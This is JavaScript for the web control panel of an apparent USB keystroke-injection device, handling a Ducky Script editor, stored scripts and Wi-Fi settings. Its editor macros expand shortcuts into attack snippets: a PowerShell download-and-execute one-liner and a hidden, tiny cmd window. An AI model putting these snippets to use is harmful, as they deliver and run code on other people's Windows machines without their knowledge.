function $(e){ return document.getElementById(e); };
var version = "9.0",
	sL = $('spinner-container'),
	notification = $("notification"),
	themeColor = getComputedStyle(document.body),
	saveStatus = $('spinner-container'),
	autoExec = $('autoExec'),
	execContainer = $('execContainer'),
	main = document.getElementsByTagName("main")[0];

// Global functions
	function page(_p) {
		// If the page is different
		_p = convertPage(false, _p);
		if (window.location.search != "?" + _p) {
			var _params = "";
			if (_p) var _params = "?" + _p;
			// Remove params from URL and add new ones
			var newurl = window.location.href.split("?")[0] + _params;
			if (history.pushState) {
				// Go to new URL without reloading
				window.history.pushState({ path: newurl }, null, newurl);
				switchPage();
			} else {
				// Browser doesn't support pushState
				window.location = newurl;
			}
		}
	};

	function switchPage(animation) {
		document.body.scrollTop = document.documentElement.scrollTop = 0;
		var curPage = "default";
		if (window.location.search) curPage = window.location.search.substr(1);
		// Convert page name to ID number
		document.getElementsByTagName("body")[0].classList.remove("execute");
		curPage = convertPage(true, curPage);
		if (curPage != 1) document.getElementsByTagName('body')[0].classList.remove('hide-nav')
		// Remove all active selectors from page elements
		var items = document.querySelectorAll('page');
		for (var i = 0; i < items.length; i++) {
			items[i].classList.remove('active');
			items[i].classList.remove('no-animation');
		}
		// Remove all active selectors from navbar items
		items = document.querySelectorAll('a');
		for (var i = 0; i < items.length; i++) {
			items[i].classList.remove('active');
		}
		// Don't show animation on page load
		if (animation == false) document.getElementById(curPage).classList.add('no-animation')
		document.getElementById(curPage).classList.add('active')
		var offset = curPage * 25;
		document.getElementsByTagName("container")[0].setAttribute("style", "transform:translate(-"+ offset +"%,0)")
		document.getElementById("nav-"+curPage).classList.add("active");
	}

	function convertPage(toNumber, subject) {
		if (toNumber == true) {
			// On page load
			switch(subject) {
				case "execute":
					document.getElementsByTagName("body")[0].classList.add("execute");
					return 1;
					break;
				case "settings":
					return 2;
					break;
				case "info":
					return 3;
					break;
				default:
					return 0;
			}
		} else {
			// On-click handlers for pages
			switch(subject) {
				case 1:
					document.getElementsByTagName("body")[0].classList.add("execute");
					return "execute";
					break;
				case 2:
					return "settings";
					break;
				case 3:
					return "info";
					break;
				default:
					return "";
			}
		}
	}

	function getResponse(adr, callback, timeoutCallback, timeout, method){
		if(timeoutCallback === undefined) {
			timeoutCallback = function(){
				notify("Failed to load /"+adr);
			};
		}
		if(timeout === undefined) timeout = 8000; 
		if(method === undefined) method = "GET";
		var xmlhttp = new XMLHttpRequest();
		xmlhttp.onreadystatechange = function() {
			if(xmlhttp.readyState == 4){
				if(xmlhttp.status == 200){
					notify("");
					callback(xmlhttp.responseText);
				}
				else timeoutCallback();
			}
		};
		xmlhttp.open(method, adr, true);
		xmlhttp.send();
		xmlhttp.timeout = timeout;
		xmlhttp.ontimeout = timeoutCallback;
	}

	/* Add scroll event listeners */
		var nav = document.getElementsByTagName("nav")[0];
		window.onscroll = function() {
			if (window.pageYOffset > 3 ) {
				nav.classList.add("n-shadow");
			} else {
				nav.classList.remove("n-shadow");
			}
		}
		main.onscroll = function() {
			if (main.scrollTop > 3) {
				nav.classList.add("n-shadow");
			} else {
				nav.classList.remove("n-shadow");
			}
		}
	function notify(msg, closeAfter) {
		if (msg) {
			notification.innerHTML = msg;
			notification.className = "show";
		} else {
			notification.className = "";
		}
		if (closeAfter !== undefined) {
			setTimeout(function() {
				notification.className = "";
			}, closeAfter);
		}
	}
	/* Waves Library */
		!function(a,b){"use strict";"function"==typeof define&&define.amd?define([],function(){return b.apply(a)}):"object"==typeof exports?module.exports=b.call(a):a.Waves=b.call(a)}("object"==typeof global?global:this,function(){"use strict";function a(a){return null!==a&&a===a.window}function b(b){return a(b)?b:9===b.nodeType&&b.defaultView}function c(a){var b=typeof a;return"function"===b||"object"===b&&!!a}function d(a){return c(a)&&a.nodeType>0}function e(a){var b=m.call(a);return"[object String]"===b?l(a):c(a)&&/^\[object (Array|HTMLCollection|NodeList|Object)\]$/.test(b)&&a.hasOwnProperty("length")?a:d(a)?[a]:[]}function f(a){var c,d,e={top:0,left:0},f=a&&a.ownerDocument;return c=f.documentElement,"undefined"!=typeof a.getBoundingClientRect&&(e=a.getBoundingClientRect()),d=b(f),{top:e.top+d.pageYOffset-c.clientTop,left:e.left+d.pageXOffset-c.clientLeft}}function g(a){var b="";for(var c in a)a.hasOwnProperty(c)&&(b+=c+":"+a[c]+";");return b}function h(a,b,c){if(c){c.classList.remove("waves-rippling");var d=c.getAttribute("data-x"),e=c.getAttribute("data-y"),f=c.getAttribute("data-scale"),h=c.getAttribute("data-translate"),i=Date.now()-Number(c.getAttribute("data-hold")),j=350-i;0>j&&(j=0),"mousemove"===a.type&&(j=150);var k="mousemove"===a.type?2500:o.duration;setTimeout(function(){var a={top:e+"px",left:d+"px",opacity:"0","-webkit-transition-duration":k+"ms","-moz-transition-duration":k+"ms","-o-transition-duration":k+"ms","transition-duration":k+"ms","-webkit-transform":f+" "+h,"-moz-transform":f+" "+h,"-ms-transform":f+" "+h,"-o-transform":f+" "+h,transform:f+" "+h};c.setAttribute("style",g(a)),setTimeout(function(){try{b.removeChild(c)}catch(a){return!1}},k)},j)}}function i(a){if(q.allowEvent(a)===!1)return null;for(var b=null,c=a.target||a.srcElement;c.parentElement;){if(!(c instanceof SVGElement)&&c.classList.contains("waves-effect")){b=c;break}c=c.parentElement}return b}function j(a){var b=i(a);if(null!==b){if(b.disabled||b.getAttribute("disabled")||b.classList.contains("disabled"))return;if(q.registerEvent(a),"touchstart"===a.type&&o.delay){var c=!1,d=setTimeout(function(){d=null,o.show(a,b)},o.delay),e=function(e){d&&(clearTimeout(d),d=null,o.show(a,b)),c||(c=!0,o.hide(e,b))},f=function(a){d&&(clearTimeout(d),d=null),e(a)};b.addEventListener("touchmove",f,!1),b.addEventListener("touchend",e,!1),b.addEventListener("touchcancel",e,!1)}else o.show(a,b),n&&(b.addEventListener("touchend",o.hide,!1),b.addEventListener("touchcancel",o.hide,!1)),b.addEventListener("mouseup",o.hide,!1),b.addEventListener("mouseleave",o.hide,!1)}}var k=k||{},l=document.querySelectorAll.bind(document),m=Object.prototype.toString,n="ontouchstart"in window,o={duration:750,delay:200,show:function(a,b,c){if(2===a.button)return!1;b=b||this;var d=document.createElement("div");d.className="waves-ripple waves-rippling",b.appendChild(d);var e=f(b),h=0,i=0;"touches"in a&&a.touches.length?(h=a.touches[0].pageY-e.top,i=a.touches[0].pageX-e.left):(h=a.pageY-e.top,i=a.pageX-e.left),i=i>=0?i:0,h=h>=0?h:0;var j="scale("+b.clientWidth/100*3+")",k="translate(0,0)";c&&(k="translate("+c.x+"px, "+c.y+"px)"),d.setAttribute("data-hold",Date.now()),d.setAttribute("data-x",i),d.setAttribute("data-y",h),d.setAttribute("data-scale",j),d.setAttribute("data-translate",k);var l={top:h+"px",left:i+"px"};d.classList.add("waves-notransition"),d.setAttribute("style",g(l)),d.classList.remove("waves-notransition"),l["-webkit-transform"]=j+" "+k,l["-moz-transform"]=j+" "+k,l["-ms-transform"]=j+" "+k,l["-o-transform"]=j+" "+k,l.transform=j+" "+k,l.opacity="1";var m="mousemove"===a.type?2500:o.duration;l["-webkit-transition-duration"]=m+"ms",l["-moz-transition-duration"]=m+"ms",l["-o-transition-duration"]=m+"ms",l["transition-duration"]=m+"ms",d.setAttribute("style",g(l))},hide:function(a,b){b=b||this;for(var c=b.getElementsByClassName("waves-rippling"),d=0,e=c.length;e>d;d++)h(a,b,c[d])}},p={input:function(a){var b=a.parentNode;if("i"!==b.tagName.toLowerCase()||!b.classList.contains("waves-effect")){var c=document.createElement("i");c.className=a.className+" waves-input-wrapper",a.className="waves-button-input",b.replaceChild(c,a),c.appendChild(a);var d=window.getComputedStyle(a,null),e=d.color,f=d.backgroundColor;c.setAttribute("style","color:"+e+";background:"+f),a.setAttribute("style","background-color:rgba(0,0,0,0);")}},img:function(a){var b=a.parentNode;if("i"!==b.tagName.toLowerCase()||!b.classList.contains("waves-effect")){var c=document.createElement("i");b.replaceChild(c,a),c.appendChild(a)}}},q={touches:0,allowEvent:function(a){var b=!0;return/^(mousedown|mousemove)$/.test(a.type)&&q.touches&&(b=!1),b},registerEvent:function(a){var b=a.type;"touchstart"===b?q.touches+=1:/^(touchend|touchcancel)$/.test(b)&&setTimeout(function(){q.touches&&(q.touches-=1)},500)}};return k.init=function(a){var b=document.body;a=a||{},"duration"in a&&(o.duration=a.duration),"delay"in a&&(o.delay=a.delay),n&&(b.addEventListener("touchstart",j,!1),b.addEventListener("touchcancel",q.registerEvent,!1),b.addEventListener("touchend",q.registerEvent,!1)),b.addEventListener("mousedown",j,!1)},k.attach=function(a,b){a=e(a),"[object Array]"===m.call(b)&&(b=b.join(" ")),b=b?" "+b:"";for(var c,d,f=0,g=a.length;g>f;f++)c=a[f],d=c.tagName.toLowerCase(),-1!==["input","img"].indexOf(d)&&(p[d](c),c=c.parentElement),-1===c.className.indexOf("waves-effect")&&(c.className+=" waves-effect"+b)},k.ripple=function(a,b){a=e(a);var c=a.length;if(b=b||{},b.wait=b.wait||0,b.position=b.position||null,c)for(var d,g,h,i={},j=0,k={type:"mousedown",button:1},l=function(a,b){return function(){o.hide(a,b)}};c>j;j++)if(d=a[j],g=b.position||{x:d.clientWidth/2,y:d.clientHeight/2},h=f(d),i.x=h.left+g.x,i.y=h.top+g.y,k.pageX=i.x,k.pageY=i.y,o.show(k,d),b.wait>=0&&null!==b.wait){var m={type:"mouseup",button:1};setTimeout(l(m,d),b.wait)}},k.calm=function(a){a=e(a);for(var b={type:"mouseup",button:1},c=0,d=a.length;d>c;c++)o.hide(b,a[c])},k.displayEffect=function(a){k.init(a)},k});

	/* Attach waves to elements */
		Waves.attach('actions a', ['waves-light']);
		Waves.attach('.card-action .button', ['waves-blue']);
		Waves.attach('button', ['waves-light']);
		Waves.attach('.button', ['waves-light']);
		Waves.attach('.reboot-inner');
		Waves.init();


// Default page
	var res;
	var table = document.getElementById("scriptlist");
	var memoryGraph = document.getElementById("memoryGraph");
	var memorySize = document.getElementById("memorySize");
	
	function loadlist(){
		getResponse("list.json",function(responseText){
			res = JSON.parse(responseText);
			
			memoryGraph.value = res.usedBytes;
			memoryGraph.max = res.totalBytes;
			
			res.usedBytes = parseInt(res.usedBytes/1000);
			res.totalBytes = parseInt(res.totalBytes/1000);
			
			memorySize.innerHTML = res.usedBytes+" / "+res.totalBytes+"KB ("+(res.totalBytes-res.usedBytes)+"KB available)";
			
			var tableHTML = "<tr><th>Name</th><th>Size</th><th>Run</th></tr>";
			for(var i=0;i<res.list.length;i++){
				tableHTML += "<tr>";
				tableHTML += "<td><a href='view.html?script="+res.list[i].n+"'>"+res.list[i].n+"</a></td>";
				tableHTML += "<td>"+res.list[i].s+"</td>";
				tableHTML += "<td><button class='selectBtn' onclick='run("+i+")'>run</button></td>";
				tableHTML += "</tr>";
			}
			table.innerHTML = tableHTML;
		});
	}
	
	function run(i) {
		getResponse("run?name="+res.list[i].n,function(responseText){
			console.log(responseText);
		},undefined,undefined,"POST");
	}
	
	function format() {
		getResponse("format",function(responseText){
			loadlist();
		});
	}



// Live execute page
	function count(){
		document.getElementById("charCount").innerHTML = document.getElementById("scriptTextArea").value.length;
	}

	function liveRun() {
		var script = document.getElementById("scriptTextArea").value.replace(/\n\r?/g, '%0D');
		getResponse("run?script="+script,function(responseText){
			if(responseText == "true") notify("Executing Script...",2500);
		},undefined,undefined, "POST");
	}

	function save() {
		var scriptName = prompt("Scriptname:");
		if(scriptName !== null){
			var script = document.getElementById("scriptTextArea").value.replace(/\n\r?/g, '%0D');
			console.log(script);
			getResponse("save?name="+scriptName+"&script="+script,function(responseText){
				if(responseText == "true") notify("Saved as '"+scriptName+"'",2500);
				loadlist();
			},undefined,undefined, "POST");
		}
	}



// Settings page
	function set(e,v) {
		document.getElementById(e).value = v;
	}
	function setChecked(e) {
		document.getElementById(e).setAttribute('checked','checked');
	}
	
	function loadSettings() {
		getResponse("settings.json",function(responseText){
			var res = JSON.parse(responseText);
			
			set("ssid",res.ssid);
			set("pswd",res.password);
			set("ch",res.channel);
			set("hidden",res.hidden);
			set("autostart",res.autostart);
			if(res.hidden) setChecked("hidden");
			if(res.syntax) {
				setChecked("syntax");
				document.getElementsByTagName("body")[0].classList.add("highlight");
			} else {
				document.getElementsByTagName("body")[0].classList.remove("highlight");
			}
			if(res.autoExec) setChecked("autoExec");
			switchEXEC()
			setTimeout(function(){document.getElementsByTagName("main")[0].classList.remove("fade-in")}, 10);
			setTimeout(function(){document.getElementsByTagName("body")[0].classList.add("animation")}, 1000);
		});
		setTimeout(function(){document.getElementsByTagName("main")[0].classList.remove("fade-in")}, 6000);
		setTimeout(function(){document.getElementsByTagName("body")[0].classList.add("animation")}, 7000);
	}
	
	function restart(){
		indicate(6)
		getResponse("restart",function(responseText){},function(){
			setTimeout(function(){indicate("true")},400);
		},1000);
		
	}
	
	function reset(){
		getResponse("reset",function(responseText){
			loadSettings();
		});
	}

	autoExec.addEventListener("change", switchEXEC, false);

	function switchEXEC() {
		if (autoExec.checked)
			execContainer.classList.remove("disabled");
		else
			execContainer.classList.add("disabled");
	}

// Syntax highlighting

		function Parser( rules, i ){
			/* INIT */
			var api = this;

			// variables used internally
			var i = i ? 'i' : '';
			var parseRE = null;
			var ruleSrc = [];
			var ruleMap = {};

			api.add = function( rules ){
				for( var rule in rules ){
					var s = rules[rule].source;
					ruleSrc.push( s );
					ruleMap[rule] = new RegExp('^('+s+')$', i );
				}
				parseRE = new RegExp( ruleSrc.join('|'), 'g'+i );
			};
			api.tokenize = function(input){
				return input.match(parseRE);
			};
			api.identify = function(token){
				for( var rule in ruleMap ){
					if( ruleMap[rule].test(token) ){
						return rule;
					}
				}
			};

			api.add( rules );

			return api;
		};

	// TextareaDecorator.js
		function TextareaDecorator( textarea, parser ){
			/* INIT */
			var api = this;
			// construct editor DOM
			var parent = document.createElement("div");
			var output = document.createElement("pre");
			parent.appendChild(output);
			// replace the textarea with RTA DOM and reattach on label
			textarea.parentNode.replaceChild( parent, textarea );
			parent.appendChild(textarea);
			var label = document.createElement("label");
			label.className="control-label"
			label.setAttribute("for", "scriptTextArea")
			label.innerHTML= 'Ducky Script <i style="color:inherit">(<span id="charCount" style="color:inherit"></span>/1024)</i>'
			parent.appendChild(label)
			var label2 = document.createElement("label");
			label2.className="bar"
			parent.appendChild(label2)
			textarea.wrap = "off";


			// coloring algorithm
			var color = function( input, output, parser ){
				var oldTokens = output.childNodes;
				var newTokens = parser.tokenize(input);
				var firstDiff, lastDiffNew, lastDiffOld;
				// find the first difference
				for( firstDiff = 0; firstDiff < newTokens.length && firstDiff < oldTokens.length; firstDiff++ )
					if( newTokens[firstDiff] !== oldTokens[firstDiff].textContent ) break;
				// trim the length of output nodes to the size of the input
				while( newTokens.length < oldTokens.length )
					output.removeChild(oldTokens[firstDiff]);
				// find the last difference
				for( lastDiffNew = newTokens.length-1, lastDiffOld = oldTokens.length-1; firstDiff < lastDiffOld; lastDiffNew--, lastDiffOld-- )
					if( newTokens[lastDiffNew] !== oldTokens[lastDiffOld].textContent ) break;
				// update modified spans
				for( ; firstDiff <= lastDiffOld; firstDiff++ ){
					oldTokens[firstDiff].className = parser.identify(newTokens[firstDiff]);
					oldTokens[firstDiff].textContent = oldTokens[firstDiff].innerText = newTokens[firstDiff];
				}
				// add in modified spans
				for( var insertionPt = oldTokens[firstDiff] || null; firstDiff <= lastDiffNew; firstDiff++ ){
					var span = document.createElement("span");
					span.className = parser.identify(newTokens[firstDiff]);
					span.textContent = span.innerText = newTokens[firstDiff];
					output.insertBefore( span, insertionPt );
				}
			};

			api.input = textarea;
			api.output = output;
			api.update = function(){
				var input = textarea.value;
				var changecursor = false;
				var oldInput = input;
				var position = textarea.selectionEnd;
				if(input.match(/^\S+/gm)){
					input = input.replace(/^\S+/gm,function(letter){return letter.toUpperCase()});
				}
				if (input.match(/(^|,)REPEAT/gm)) {
					input = input.replace(/(^|,)REPEAT/gm, "REPLAY");
				}
				if (input.match(/(^|,)WINDOWS/gm)) {
					input = input.replace(/(^|,)WINDOWS/gm, "GUI");
					position = position - 4;
				}
				if (input.match(/(^|,)RUN/gm)) {
					input = input.replace(/(^|,)RUN/gm, "GUI R\nDELAY 450\nSTRING \nENTER");
					changecursor = true;
					position = position + 20;
				}
				if (input.match(/(^|,)HCMD/gm)) {
					input = input.replace(/(^|,)HCMD/gm, "GUI R\nDELAY 450\nSTRING cmd /t:fe /k \"mode con: cols=21 lines=1\"\nENTER\nDELAY 600\nSTRING \nENTER");
					changecursor = true;
					position = position + 83;
				}
				if (input.match(/(^|,)CMD/gm)) {
					input = input.replace(/(^|,)CMD/gm, "GUI R\nDELAY 450\nSTRING cmd\nENTER\nDELAY 600\nSTRING \nENTER");
					changecursor = true;
					position = position + 47;
				}
				if (input.match(/(^|,)DOWNLOAD/gm)) {
					input = input.replace(/(^|,)DOWNLOAD/gm, "GUI R\nDELAY 450\nSTRING powershell\nENTER\nDELAY 600\nSTRING $d=New-Object System.Net.WebClient;$u='http://';$f=\"_\";$f+=Get-Random;$f+=[System.IO.Path]::GetExtension($u);$d.DownloadFile($u,$f);$e=New-Object -com shell.application;$e.shellexecute($f);exit\nENTER");
					changecursor = true;
					position = position + 95;
				}
				if (input.match(/(^|,)SLEEP/gm)) {
					input = input.replace(/(^|,)SLEEP/gm, "DELAY");
				}
				if (input.match(/(^|,)RETURN/gm)) {
					input = input.replace(/(^|,)RETURN/gm, "ENTER");
					position = position - 1;
				}
				if (input.match(/(^|,)1/gm)) {
					input = input.replace(/(^|,)1/gm, "STRING ");
					changecursor = true;
					position = position + 6;
				}
				if (input.match(/(^|,)2/gm)) {
					input = input.replace(/(^|,)2/gm, "DELAY ");
					changecursor = true;
					position = position + 5;
				}
				if (input.match(/(^|,)3/gm)) {
					input = input.replace(/(^|,)3/gm, "REPLAY ");
					changecursor = true;
					position = position + 6;
				}
				if (input.match(/(^|,)4/gm)) {
					input = input.replace(/(^|,)4/gm, "GUI ");
					changecursor = true;
					position = position + 3;
				}
				if (input.match(/(^|,)5/gm)) {
					input = input.replace(/(^|,)5/gm, "ENTER\n");
					changecursor = true;
					position = position + 5;
				}
				if (input.match(/(^|,)6/gm)) {
					input = input.replace(/(^|,)6/gm, "TAB\n");
					changecursor = true;
					position = position + 3;
				}
				if (input.match(/(^|,)7/gm)) {
					input = input.replace(/(^|,)7/gm, "REM ");
					changecursor = true;
					position = position + 3;
				}
				if (input.match(/(^|,)8/gm)) {
					input = input.replace(/(^|,)8/gm, "GUI R");
					changecursor = true;
					position = position + 4;
				}
				if (input != oldInput) {
					// Capture cursor position (prevents the cursor from jumping to end after every key press)
					textarea.value = input;
					var ua = navigator.userAgent.toLowerCase();
					var isAndroid = ua.indexOf("android") > -1;
					if(isAndroid && changecursor) {
						setTimeout(function(){textarea.selectionStart = position;textarea.selectionEnd = position},0)
					} else if (isAndroid && position == input.length) {
						// If Android and at the end of the line
						textarea.selectionStart = textarea.selectionEnd = textarea.value.length;
					} else {
						// Set cursor position on normal browsers
						textarea.selectionEnd = position
					}
				}
				if( input ){
					color( input, output, parser );
					// determine the best size for the textarea
					var lines = input.split('\n');
					// find the number of columns
					var maxlen = 0, curlen;
					for( var i = 0; i < lines.length; i++ ){
						// calculate the width of each tab
						var tabLength = 0, offset = -1;
						while( (offset = lines[i].indexOf( '\t', offset+1 )) > -1 ){
							tabLength += 7 - (tabLength + offset) % 8;
						}
						var curlen = lines[i].length + tabLength;
						// store the greatest line length thus far
						maxlen = maxlen > curlen ? maxlen : curlen;
					}
					textarea.cols = maxlen + 1;
					textarea.rows = lines.length + 1;
				} else {
					// clear the display
					output.innerHTML = '';
					// reset textarea rows/cols
					textarea.cols = textarea.rows = 1;
				}
				count()
			};

			// detect all changes to the textarea,
			// including keyboard input, cut/copy/paste, drag & drop, etc
			if( textarea.addEventListener ){
				// standards browsers: oninput event
				textarea.addEventListener( "input", api.update, false );
			} else {
				// MSIE: detect changes to the 'value' property
				textarea.attachEvent( "onpropertychange",
					function(e){
						if( e.propertyName.toLowerCase() === 'value' ){
							api.update();
						}
					}
				);
			}
			// initial highlighting
			api.update();

			return api;
		};
		// generic syntax parser
		var parser = new Parser({
			whitespace: /\s+/,
			comment: /(REM|#)[^\r\n]*/,
			number: /0x[\dA-Fa-f]+|-?(\d+\.?\d*|\.\d+)/,
			string: /STRING(.*)/,
			key: /(WINDOWS|GUI|SHIFT|ALT|CTRL|ENTER|DELETE|ESC|INSERT|SPACE|TAB|DOWN|LEFT|RIGHT|UP|CAPSLOCK|HOME|APP|MENU|PAGEUP|PAGEDOWN)(?!\w|=)/,
			keyword: /(DELAY|DEFAULTDELAY|REPLAY)(?!\w|=)/,
			text: /\S+/,
		});
		// wait for the page to finish loading before accessing the DOM
		window.onload = function(){
			// get the textarea
			var textarea = $('scriptTextArea');
			// start the highlighter
			decorator = new TextareaDecorator( textarea, parser );
		};
		function indicate(indState) {
		  if (indState == null) {
			saveStatus.classList.remove("show-loading");
			setTimeout(function() {saveStatus.className = ""}, 500)
		  } else if (indState == 6) {
		  	saveStatus.classList.add("show-loading");
		  } else if (indState == true) {
			saveStatus.classList.add("show-loading");
			saveStatus.classList.add("success-save");
			setTimeout(function(){indicate()}, 2500);
		  } else if (indState == false){
			saveStatus.classList.add("show-loading");
			saveStatus.classList.add("failed-save");
			setTimeout(function(){indicate()}, 2500);
		  }
		}


// Execute on page load
	switchPage(false);
	loadlist();
	loadSettings();

	// Windows URL listener (Eg. History back + forward keys)

	var currentPage = window.location.href;

	// listen for changes
	setInterval(function() {
		if (currentPage != window.location.href) {
			// page has changed, set new page as 'current'
			currentPage = window.location.href;
			switchPage()
		}
	}, 500);
